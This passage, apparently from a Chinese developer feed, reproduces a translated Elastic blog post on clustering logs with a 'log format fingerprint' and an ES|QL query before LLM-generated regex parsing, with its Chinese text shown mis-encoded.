<li><strong>è¿‡äºå¼‚è´¨ï¼ˆconfusionï¼‰ï¼šç›¸å</strong>ï¼Œå¦‚æœæ ·æœ¬ä¸­åŒ…å«æ˜æ˜¾çš„æ ¼å¼å·®å¼‚ â€”â€” æˆ–è€…æ›´ç³Ÿçš„æ˜¯ï¼ŒåŒ…å«è¯¸å¦‚ progress barsã€memory tablesã€ASCII art ç­‰ â€œtrash logsâ€ â€”â€” æ¨¡å‹å°±å¾ˆéš¾æ‰¾åˆ°å…±åŒç‚¹ã€‚å®ƒå¾€å¾€ä¼šç”Ÿæˆå¤æ‚ä½†æœ‰é—®é¢˜çš„ regexï¼Œæˆ–è€…å¹²è„†è¿‡åº¦æ³›åŒ–ï¼ŒæŠŠæ•´è¡Œéƒ½è§£ææˆä¸€ä¸ªå•ä¸€çš„ message blob å­—æ®µã€‚</li>
</ul>
<h3 data-id="heading-4">ä¸Šä¸‹æ–‡çª—å£é™åˆ¶</h3>
<p>æˆ‘ä»¬è¿˜é‡åˆ°äº† context window çš„ç“¶é¢ˆã€‚å½“è¾“å…¥çš„ logs å¾ˆé•¿ã€å·®å¼‚å¾ˆå¤§ï¼Œæˆ–è€…åŒ…å«å¤§é‡å¯æå–å­—æ®µæ—¶ï¼Œæ¨¡å‹çš„è¾“å‡ºè´¨é‡å¾€å¾€ä¼šä¸‹é™ï¼Œå˜å¾— â€œæ‚ä¹±â€ï¼Œæˆ–è€…é•¿åº¦è¿‡é•¿è€Œæ— æ³•æ”¾å…¥è¾“å‡ºçš„ context windowã€‚è‡ªç„¶åœ°ï¼Œchunking åœ¨è¿™ç§æƒ…å†µä¸‹ä¼šæœ‰æ‰€å¸®åŠ©ã€‚é€šè¿‡ä½¿ç”¨åŸºäºå­—ç¬¦å’ŒåŸºäºå®ä½“çš„åˆ†éš”ç¬¦æ¥æ‹†åˆ† logsï¼Œæˆ‘ä»¬å¯ä»¥å¸®åŠ©æ¨¡å‹ä¸“æ³¨äºæå–ä¸»è¦å­—æ®µï¼Œè€Œä¸ä¼šè¢«å™ªå£°æ·¹æ²¡ã€‚</p>
<h3 data-id="heading-5">ä¸€è‡´æ€§ä¸æ ‡å‡†åŒ–å·®è·</h3>
<p>å³ä½¿æ¨¡å‹æˆåŠŸç”Ÿæˆäº†è§£æè§„åˆ™ï¼Œæˆ‘ä»¬ä»ç„¶æ³¨æ„åˆ°ä¸€äº›ç»†å¾®çš„ä¸ä¸€è‡´æ€§ï¼š</p>
<ul>
<li><strong>æœåŠ¡å‘½åå·®å¼‚</strong>ï¼šæ¨¡å‹åœ¨ä¸åŒè¿è¡Œä¸­ä¼šä¸ºåŒä¸€å®ä½“æå‡ºä¸åŒåç§°ï¼ˆä¾‹å¦‚ï¼Œå°† source æ ‡æ³¨ä¸º â€œSparkâ€ã€ â€œApache Sparkâ€ å’Œ â€œSpark Log Analyticsâ€ï¼‰ã€‚</li>
<li><strong>å­—æ®µå‘½åå·®å¼‚</strong>ï¼šå­—æ®µåç§°ç¼ºä¹æ ‡å‡†åŒ–ï¼ˆä¾‹å¦‚ idã€ service.idã€ device.idï¼‰ã€‚æˆ‘ä»¬ä½¿ç”¨æ ‡å‡†åŒ–çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fecs%2Fecs-field-reference" title="https://www.elastic.co/docs/reference/ecs/ecs-field-reference" target="_blank" ref="nofollow noopener noreferrer">Elastic å­—æ®µå‘½å</a>å¯¹åç§°è¿›è¡Œäº†å½’ä¸€åŒ–ã€‚</li>
<li><strong>è§£æç²’åº¦å·®å¼‚</strong>ï¼šå­—æ®µæå–çš„è§£æç²’åº¦ä¼šæ ¹æ®è¾“å…¥æ—¥å¿—å½¼æ­¤ä¹‹é—´çš„ç›¸ä¼¼ç¨‹åº¦è€Œå˜åŒ–ã€‚</li>
</ul>
<h2 data-id="heading-6">æ—¥å¿—æ ¼å¼æŒ‡çº¹</h2>
<p>ä¸ºäº†è§£å†³æ—¥å¿—ç›¸ä¼¼æ€§çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸€ç§é«˜æ€§èƒ½çš„å¯å‘å¼æ–¹æ³•ï¼šæ—¥å¿—æ ¼å¼æŒ‡çº¹ï¼ˆ <strong>log format fingerprint, LFF</strong> ï¼‰ã€‚</p>
<p>æˆ‘ä»¬ä¸å†ç›´æ¥æŠŠåŸå§‹ã€å˜ˆæ‚çš„æ—¥å¿—è¾“å…¥åˆ° LLM ä¸­ï¼Œè€Œæ˜¯å…ˆå¯¹æ¯æ¡æ—¥å¿—åº”ç”¨ä¸€ä¸ªç¡®å®šæ€§çš„è½¬æ¢ï¼Œä»¥æ­ç¤ºå…¶åº•å±‚ç»“æ„ã€‚è¿™ä¸ªé¢„å¤„ç†æ­¥éª¤ä¼šæŠ½è±¡æ‰å¯å˜æ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ªç®€åŒ–çš„ â€œæŒ‡çº¹â€ï¼Œä»è€Œè®©æˆ‘ä»¬å¯ä»¥å¯¹ç›¸å…³æ—¥å¿—è¿›è¡Œåˆ†ç»„ã€‚</p>
<p>æ˜ å°„é€»è¾‘è¢«è®¾è®¡å¾—éå¸¸ç®€å•ï¼Œä»¥ä¿è¯é€Ÿåº¦å’Œä¸€è‡´æ€§ï¼š</p>
<ul>
<li><strong>æ•°å­—æŠ½è±¡</strong>ï¼šä»»ä½•ç”±æ•°å­—ï¼ˆ 0â€“9 ï¼‰ç»„æˆçš„åºåˆ—éƒ½ä¼šè¢«æ›¿æ¢ä¸ºä¸€ä¸ª â€˜0â€™ã€‚</li>
<li><strong>æ–‡æœ¬æŠ½è±¡</strong>ï¼šä»»ä½•ç”±å­—æ¯å­—ç¬¦ç»„æˆå¹¶åŒ…å«ç©ºæ ¼çš„åºåˆ—éƒ½ä¼šè¢«æ›¿æ¢ä¸ºä¸€ä¸ª â€˜aâ€™ã€‚</li>
<li><strong>ç©ºç™½è§„èŒƒåŒ–</strong>ï¼šæ‰€æœ‰è¿ç»­çš„ç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰éƒ½ä¼šæŠ˜å ä¸ºä¸€ä¸ªç©ºæ ¼ã€‚</li>
<li><strong>ç¬¦å·ä¿ç•™</strong>ï¼šæ ‡ç‚¹ç¬¦å·å’Œç‰¹æ®Šå­—ç¬¦ï¼ˆä¾‹å¦‚ : ã€ [ ã€ ] ã€ / ï¼‰ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æ˜¯æ—¥å¿—ç»“æ„ä¸­æœ€å¼ºçš„æŒ‡ç¤ºä¿¡å·ã€‚</li>
</ul>
<p>æˆ‘ä»¬å¼•å…¥äº†è¿™ç§æ—¥å¿—æ˜ å°„æ–¹æ³•ã€‚åŸºç¡€çš„æ˜ å°„è§„åˆ™åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>ä»»æ„é•¿åº¦çš„æ•°å­— 0â€“9 â†’ æ›¿æ¢ä¸º â€˜0â€™ã€‚</li>
<li>ä»»æ„é•¿åº¦çš„æ–‡æœ¬ï¼ˆå¸¦ç©ºæ ¼çš„å­—æ¯å­—ç¬¦ï¼‰ â†’ æ›¿æ¢ä¸º â€˜aâ€™ã€‚</li>
<li>ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ â†’ åˆå¹¶ä¸ºä¸€ä¸ªç©ºæ ¼ã€‚</li>
</ul>
<p>ä¸‹é¢æ¥çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºè¿™ç§æ˜ å°„æ˜¯å¦‚ä½•å¸®åŠ©æˆ‘ä»¬è½¬æ¢æ—¥å¿—çš„ã€‚</p>
<pre><code class="hljs language-less" lang="less">`<span class="hljs-number">1</span>.  <span class="hljs-number">17</span>/<span class="hljs-number">06</span>/<span class="hljs-number">09</span>	<span class="hljs-number">20</span>:<span class="hljs-number">10</span>:<span class="hljs-number">56</span>	<span class="hljs-selector-tag">INFO</span>	<span class="hljs-selector-tag">executor</span><span class="hljs-selector-class">.CoarseGrainedExecutorBackend</span>:	<span class="hljs-selector-tag">Got</span> <span class="hljs-selector-tag">assigned</span> <span class="hljs-selector-tag">task</span> <span class="hljs-number">912</span>
<span class="hljs-number">2</span>.  <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>		<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>		<span class="hljs-selector-tag">a</span>	<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span>: 							<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span>
<span class="hljs-number">3</span>.  <span class="hljs-number">17</span>/<span class="hljs-number">06</span>/<span class="hljs-number">09</span>	<span class="hljs-number">20</span>:<span class="hljs-number">10</span>:<span class="hljs-number">58</span>	<span class="hljs-selector-tag">INFO</span>	<span class="hljs-selector-tag">mapred</span><span class="hljs-selector-class">.SparkHadoopMapRedUtil</span>:	<span class="hljs-selector-tag">attempt_</span> <span class="hljs-number">2017060920</span><span class="hljs-selector-tag">_081_136</span>: <span class="hljs-selector-tag">Committed</span>
<span class="hljs-number">4</span>.  <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>	 	<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span> 	  	<span class="hljs-selector-tag">a</span>  	<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span>: 							<span class="hljs-selector-tag">a_0_0_0</span>: <span class="hljs-selector-tag">a</span>
<span class="hljs-number">5</span>.  <span class="hljs-number">2015</span><span class="hljs-selector-tag">-07-29</span>	<span class="hljs-number">19</span>:<span class="hljs-number">23</span>:<span class="hljs-number">30</span>,<span class="hljs-number">320</span>	<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">WARN</span>  <span class="hljs-selector-attr">[RecvWorker:18861024:$RecvWorker@765]</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Interrupting</span> <span class="hljs-selector-tag">SendWorker</span>
<span class="hljs-number">6</span>.  <span class="hljs-number">0</span><span class="hljs-selector-tag">-0-0</span>		<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>,<span class="hljs-number">0</span> 	<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">a</span>	<span class="hljs-selector-attr">[a:0:a$a@0]</span>` <span class="hljs-selector-tag">AI</span>å†™ä»£ç 
</code></pre>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°å¦‚ä¸‹çš„æ—¥å¿—æ©ç ï¼š</p>
<pre><code class="hljs language-less" lang="less">`

<span class="hljs-number">1</span>.  <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>		<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>		<span class="hljs-selector-tag">a</span>	<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span>: 			<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span>
<span class="hljs-number">2</span>.  <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span>	 	<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span> 	  	<span class="hljs-selector-tag">a</span>  	<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span>: 			<span class="hljs-selector-tag">a_0_0_0</span>: <span class="hljs-selector-tag">a</span>
<span class="hljs-number">3</span>.  <span class="hljs-number">0</span><span class="hljs-selector-tag">-0-0</span>		<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>,<span class="hljs-number">0</span> 	<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">a</span>	<span class="hljs-selector-attr">[a:0:a$a@0]</span>		<span class="hljs-selector-tag">a</span>

`<span class="hljs-selector-tag">AI</span>å†™ä»£ç 
</code></pre>
<p>æ³¨æ„å‰ä¸¤æ¡æ—¥å¿—çš„æŒ‡çº¹ã€‚å°½ç®¡å®ƒä»¬çš„ timestampã€source class å’Œ message å†…å®¹ä¸åŒï¼Œä½†å®ƒä»¬çš„å‰ç¼€ï¼ˆ0/0/0 0:0:0 a a.a:ï¼‰æ˜¯ç›¸åŒçš„ã€‚è¿™ç§ç»“æ„ä¸Šçš„ä¸€è‡´æ€§ä½¿æˆ‘ä»¬èƒ½å¤Ÿè‡ªåŠ¨å°†è¿™äº›æ—¥å¿—å½’å…¥åŒä¸€ä¸ªç°‡ã€‚</p>
<p>ç„¶è€Œï¼Œç¬¬ä¸‰æ¡æ—¥å¿—ç”Ÿæˆäº†å®Œå…¨ä¸åŒçš„æŒ‡çº¹ï¼ˆ0-0-0â€¦ï¼‰ï¼Œè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨è°ƒç”¨ LLM ä¹‹å‰ï¼Œé€šè¿‡ç®—æ³•å°†å…¶ä»ç¬¬ä¸€ç»„ä¸­åˆ†ç¦»å‡ºæ¥ã€‚</p>
<h3 data-id="heading-7">é¢å¤–éƒ¨åˆ†ï¼šä½¿ç”¨ ES|QL å³åˆ»å®ç°</h3>
<p>åªéœ€åœ¨ Discover ä¸­ä¼ å…¥ä»¥ä¸‹æŸ¥è¯¢å³å¯ã€‚</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> loghub <span class="hljs-operator">|</span>
<span class="hljs-number">2.</span>  EVAL <span class="hljs-keyword">pattern</span> <span class="hljs-operator">=</span> REPLACE(REPLACE(REPLACE(REPLACE(raw_message, "[ \t\n]+", " "), "[A-Za-z]+", "a"), "[0-9]+", "0"), "a( a)+", "a") <span class="hljs-operator">|</span>
<span class="hljs-number">3.</span>  STATS total_count <span class="hljs-operator">=</span> <span class="hljs-built_in">COUNT</span>(), ratio <span class="hljs-operator">=</span> <span class="hljs-built_in">COUNT</span>() <span class="hljs-operator">/</span> <span class="hljs-number">2000.0</span>, datasources<span class="hljs-operator">=</span><span class="hljs-keyword">VALUES</span>(filename), example<span class="hljs-operator">=</span>TOP(raw_message, <span class="hljs-number">3</span>, "desc") <span class="hljs-keyword">BY</span> <span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">pattern</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>) <span class="hljs-operator">|</span>
<span class="hljs-number">4.</span>  SORT total_count <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span>
<span class="hljs-number">5.</span>  LIMIT <span class="hljs-number">100</span>

`AIå†™ä»£ç 
</code></pre>
<p>æŸ¥è¯¢è§£æï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> loghub:Targets our index containing the raw log data.
<span class="hljs-number">2.</span>  EVAL <span class="hljs-keyword">pattern</span> <span class="hljs-operator">=</span> â€¦:  The core mapping logic. We chain REPLACE functions <span class="hljs-keyword">to</span> perform the abstraction (e.g. digits <span class="hljs-keyword">to</span> <span class="hljs-string">'0'</span>, text <span class="hljs-keyword">to</span> <span class="hljs-string">'a'</span>, etc.) <span class="hljs-keyword">and</span> save the <span class="hljs-keyword">result</span> <span class="hljs-keyword">in</span> a â€œ<span class="hljs-keyword">pattern</span>â€ field. 
<span class="hljs-number">3.</span>  STATS [column1 <span class="hljs-operator">=</span>] expression1, â€¦ <span class="hljs-keyword">BY</span> <span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">pattern</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>): 
<span class="hljs-number">4.</span>  This <span class="hljs-keyword">is</span> a clustering step. We <span class="hljs-keyword">group</span> logs that share the <span class="hljs-keyword">first</span> <span class="hljs-number">15</span> characters <span class="hljs-keyword">of</span> their <span class="hljs-keyword">pattern</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">create</span> aggregated fields such <span class="hljs-keyword">as</span> total log count <span class="hljs-keyword">per</span> <span class="hljs-keyword">group</span>, list <span class="hljs-keyword">of</span> log datasources, <span class="hljs-keyword">pattern</span> prefix, <span class="hljs-number">3</span> log examples  
<span class="hljs-number">5.</span>  SORT total_count <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span> : Surfaces the top <span class="hljs-number">100</span> most frequent log patterns

`AIå†™ä»£ç 
</code></pre>
<p>LogHub ä¸Šçš„æŸ¥è¯¢ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff76dcf06f0d4d67b91ff582127fe56a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768009888&amp;x-signature=YMZg5EFaJZ9cyhO2gx6OVWoU16I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b14fdc2d69546c18394e4526ddf1bec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768009888&amp;x-signature=LRSEI%2FkipAINv4C4I71EpiUGEc0%3D" alt="" loading="lazy"/></p>
<p>å¦‚å¯è§†åŒ–æ‰€ç¤ºï¼Œè¿™ç§ â€œLLM-freeâ€ æ–¹æ³•èƒ½å¤Ÿé«˜ç²¾åº¦åœ°å¯¹æ—¥å¿—è¿›è¡Œåˆ†åŒºã€‚å®ƒæˆåŠŸåœ°å°† 16 ä¸ªæ•°æ®æºä¸­çš„ 10 ä¸ªå®Œå…¨èšç±»ï¼ˆ&gt;90%ï¼ŒåŸºäº LogHub æ ‡ç­¾ï¼‰ï¼Œå¹¶åœ¨ 16 ä¸ªæ•°æ®æºä¸­æœ‰ 13 ä¸ªå®ç°å¤šæ•°èšç±»ï¼ˆ&gt;60%ï¼‰â€”â€”å…¨éƒ¨æ— éœ€é¢å¤–æ¸…æ´—ã€é¢„å¤„ç†æˆ–å¾®è°ƒã€‚</p>
<p>æ—¥å¿—æ ¼å¼æŒ‡çº¹ï¼ˆ log format fingerprint, LFFï¼‰ä¸ºå¤æ‚çš„ ML è§£å†³æ–¹æ¡ˆï¼ˆå¦‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Faggregations%2Fsearch-aggregations-bucket-categorize-text-aggregation" title="https://www.elastic.co/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation" target="_blank" ref="nofollow noopener noreferrer">æ—¥å¿—æ¨¡å¼åˆ†æ</a>ï¼‰æä¾›äº†ä¸€ä¸ªåŠ¡å®ä¸”é«˜æ•ˆçš„æ›¿ä»£æ–¹æ¡ˆå’Œè¡¥å……ã€‚å®ƒèƒ½å¤Ÿç«‹å³æ´å¯Ÿæ—¥å¿—ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶æœ‰æ•ˆç®¡ç†å¤§è§„æ¨¡æ—¥å¿—ç°‡ã€‚</p>
<p>ä½œä¸ºåŸºç¡€å·¥å…·çš„å¤šç”¨é€”æ€§<br/>
å¾—ç›Šäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fgetting-started-elasticsearch-query-language" title="https://www.elastic.co/blog/getting-started-elasticsearch-query-language" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> çš„å®ç°ï¼ŒLFF æ—¢å¯ä½œä¸ºå¿«é€Ÿæ•°æ®è¯Šæ–­/å¯è§†åŒ–çš„ç‹¬ç«‹å·¥å…·ï¼Œä¹Ÿå¯ä½œä¸ºé«˜ååé‡æ—¥å¿—åˆ†æç®¡é“ä¸­çš„æ„å»ºæ¨¡å—ã€‚</p>
<p>çµæ´»æ€§<br/>
LFF æ˜“äºè‡ªå®šä¹‰å’Œæ‰©å±•ï¼Œä»¥æ•è·ç‰¹å®šæ¨¡å¼ï¼Œä¾‹å¦‚åå…­è¿›åˆ¶æ•°å­—å’Œ IP åœ°å€ã€‚</p>
<p>ç¡®å®šæ€§ç¨³å®šæ€§<br/>
ä¸åŸºäº ML çš„èšç±»ç®—æ³•ä¸åŒï¼ŒLFF çš„é€»è¾‘ç®€å•ä¸”ç¡®å®šæ€§ã€‚æ–°è¿›å…¥çš„æ—¥å¿—ä¸ä¼šå¯¹å·²æœ‰æ—¥å¿—ç°‡äº§ç”Ÿå›æº¯å½±å“ã€‚</p>
<p>æ€§èƒ½ä¸å†…å­˜<br/>
å®ƒå ç”¨æœ€å°‘çš„å†…å­˜ï¼Œæ— éœ€è®­ç»ƒæˆ– GPUï¼Œéå¸¸é€‚åˆå®æ—¶é«˜ååé‡ç¯å¢ƒã€‚</p>
<h2 data-id="heading-8">å°†æ—¥å¿—æ ¼å¼æŒ‡çº¹ä¸ LLM ç»“åˆ</h2>
<p>ä¸ºäº†éªŒè¯æ‰€æå‡ºçš„æ··åˆæ¶æ„ï¼Œæ¯æ¬¡å®éªŒéƒ½åŒ…å«æ¥è‡ªæ¯ä¸ªæ•°æ®æºçš„éšæœº 20% æ—¥å¿—å­é›†ã€‚è¿™ä¸ªé™åˆ¶æ¨¡æ‹Ÿäº†çœŸå®ç”Ÿäº§ç¯å¢ƒä¸­æ—¥å¿—æŒ‰æ‰¹å¤„ç†è€Œéä½œä¸ºå•ä¸€å†å²æ•°æ®å—å¤„ç†çš„æƒ…å†µã€‚</p>
<p>ç›®æ ‡æ˜¯è¯æ˜ LFF ä½œä¸ºæœ‰æ•ˆå‹ç¼©å±‚çš„ä½œç”¨ã€‚æˆ‘ä»¬æ—¨åœ¨è¯æ˜å¯ä»¥ä»å°å‹ã€ç²¾å¿ƒæŒ‘é€‰çš„æ ·æœ¬ç”Ÿæˆé«˜è¦†ç›–ç‡çš„è§£æè§„åˆ™ï¼Œå¹¶æˆåŠŸæ¨å¹¿åˆ°æ•´ä¸ªæ•°æ®é›†ã€‚</p>
<h2 data-id="heading-9">æ‰§è¡Œæµç¨‹</h2>
<p>æˆ‘ä»¬å®ç°äº†ä¸€ä¸ªå¤šé˜¶æ®µç®¡é“ï¼Œåœ¨æ•°æ®åˆ°è¾¾ LLM ä¹‹å‰è¿›è¡Œè¿‡æ»¤ã€èšç±»ï¼Œå¹¶åº”ç”¨åˆ†å±‚é‡‡æ ·ã€‚</p>
<p>1ï¼‰ä¸¤é˜¶æ®µåˆ†å±‚èšç±»</p>
<ul>
<li><strong>å­ç±»ï¼ˆç²¾ç¡®åŒ¹é…ï¼‰</strong>ï¼šæ—¥å¿—æŒ‰å®Œå…¨ç›¸åŒçš„æŒ‡çº¹èšåˆã€‚æ¯ä¸ªå­ç±»ä¸­çš„æ—¥å¿—å…±äº«å®Œå…¨ç›¸åŒçš„æ ¼å¼ç»“æ„ã€‚</li>
<li><strong>å¼‚å¸¸æ¸…ç†</strong>ï¼šæˆ‘ä»¬ä¸¢å¼ƒå æ€»æ—¥å¿—é‡ä¸è¶³ 5% çš„å­ç±»ã€‚è¿™ç¡®ä¿ LLM ä¸“æ³¨äºä¸»å¯¼ä¿¡å·ï¼Œè€Œä¸ä¼šè¢«å™ªå£°æˆ–æ ¼å¼é”™è¯¯çš„æ—¥å¿—åˆ†æ•£æ³¨æ„åŠ›ã€‚</li>
<li><strong>å…ƒç±»ï¼ˆå‰ç¼€åŒ¹é…ï¼‰</strong>ï¼šå‰©ä½™å­ç±»æŒ‰æŒ‡çº¹åŒ¹é…çš„å‰ N ä¸ªå­—ç¬¦åˆ†ç»„åˆ°å…ƒç±»ä¸­ã€‚è¿™ç§åˆ†ç»„ç­–ç•¥æœ‰æ•ˆåœ°å°†è¯æ±‡ç›¸ä¼¼çš„æ ¼å¼å½’å…¥åŒä¸€ç±»ã€‚å¯¹äºæœªçŸ¥æ•°æ®æºï¼Œæˆ‘ä»¬åœ¨æ—¥å¿—è§£æä¸­é€‰æ‹© N=5ï¼Œæ—¥å¿—åˆ†åŒºä¸­é€‰æ‹© N=15ã€‚åˆ†å±‚é‡‡æ ·</li>
</ul>
<p>2ï¼‰ä¸€æ—¦æ„å»ºå¥½åˆ†å±‚æ ‘ï¼Œæˆ‘ä»¬å°±ä¸º LLM æ„å»ºæ—¥å¿—æ ·æœ¬ã€‚æˆ˜ç•¥ç›®æ ‡æ˜¯æœ€å¤§åŒ–æ–¹å·®è¦†ç›–ï¼ŒåŒæ—¶æœ€å°åŒ– token ä½¿ç”¨é‡ã€‚</p>
<ul>
<li>æˆ‘ä»¬ä»æ¯ä¸ªå…ƒç±»ä¸­æ¯ä¸ªæœ‰æ•ˆå­ç±»é€‰æ‹©ä»£è¡¨æ€§æ—¥å¿—ã€‚</li>
<li>ä¸ºå¤„ç†å­ç±»è¿‡å¤šçš„æç«¯æƒ…å†µï¼Œæˆ‘ä»¬åº”ç”¨éšæœºä¸‹é‡‡æ ·ä»¥é€‚åº”ç›®æ ‡çª—å£å¤§å°ã€‚</li>
</ul>
<p>3ï¼‰è§„åˆ™ç”Ÿæˆ</p>
<ul>
<li>æœ€åï¼Œæˆ‘ä»¬æç¤º LLM ä¸ºæ¯ä¸ªå…ƒç±»æä¾›çš„æ ·æœ¬ç”Ÿæˆé€‚é…æ‰€æœ‰æ—¥å¿—çš„ regex è§£æè§„åˆ™ã€‚åœ¨æˆ‘ä»¬çš„ PoC ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† GPT-4o mini æ¨¡å‹ã€‚</li>
</ul>
<h2 data-id="heading-10">å®éªŒç»“æœä¸è§‚å¯Ÿ</h2>
<p>åœ¨ Loghub æ•°æ®é›†ä¸Šï¼Œæˆ‘ä»¬å®ç°äº† 94% çš„è§£æå‡†ç¡®ç‡å’Œ 91% çš„åˆ†åŒºå‡†ç¡®ç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf5062a044464beaab09e23a1a70d745~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768009888&amp;x-signature=%2FZAAPBKCbPxvtThwrmZeWCGXP20%3D" alt="" loading="lazy"/></p>
<p>ä¸Šå›¾çš„æ··æ·†çŸ©é˜µå±•ç¤ºäº†æ—¥å¿—åˆ†åŒºç»“æœã€‚çºµè½´è¡¨ç¤ºå®é™…æ•°æ®æºï¼Œæ¨ªè½´è¡¨ç¤ºé¢„æµ‹æ•°æ®æºã€‚çƒ­åŠ›å›¾çš„é¢œè‰²æ·±æµ…å¯¹åº”æ—¥å¿—æ•°é‡ï¼Œé¢œè‰²è¶Šæµ…è¡¨ç¤ºæ•°é‡è¶Šå¤šã€‚å¯¹è§’çº¿çš„å¯¹é½æ˜¾ç¤ºæ¨¡å‹åœ¨æºå½’å±ä¸Šçš„é«˜å‡†ç¡®æ€§ï¼Œæ•£å¸ƒæœ€å°ã€‚</p>
<h2 data-id="heading-11">æˆ‘ä»¬çš„æ€§èƒ½åŸºå‡†æ´å¯Ÿï¼š</h2>
<ul>
<li><strong>æœ€ä¼˜åŸºçº¿</strong>ï¼šæ¯ç±» 30â€“40 æ¡æ—¥å¿—æ ·æœ¬çš„ä¸Šä¸‹æ–‡çª—å£è¢«è¯æ˜æ˜¯â€œæœ€ä½³åŒºé—´â€ï¼Œèƒ½å¤Ÿç¨³å®šç”Ÿæˆå¯é çš„ Regex å’Œ Grok è§£ææ¨¡å¼ã€‚</li>
<li><strong>è¾“å…¥æœ€å°åŒ–</strong>ï¼šæˆ‘ä»¬å°†æ¯ç±»çš„è¾“å…¥è§„æ¨¡å‹ç¼©åˆ° 10 æ¡æ—¥å¿—ç”¨äº Regex æ¨¡å¼ï¼Œè§£ææ€§èƒ½ä»…ä¸‹é™ 2%ï¼Œç¡®è®¤åŸºäºå¤šæ ·æ€§çš„é‡‡æ ·æ¯”åŸå§‹æ•°é‡æ›´å…³é”®ã€‚</li>
</ul>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Flog-parsing-partitioning-automation-experiments-streams" title="https://www.elastic.co/search-labs/blog/log-parsing-partitioning-automation-experiments-streams" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ json-server å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ REST API]]></title>    <link>https://juejin.cn/post/7589932422654902308</link>    <guid>https://juejin.cn/post/7589932422654902308</guid>    <pubDate>2026-01-02T17:12:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654902308" data-draft-id="7589919989039267903" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ json-server å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ REST 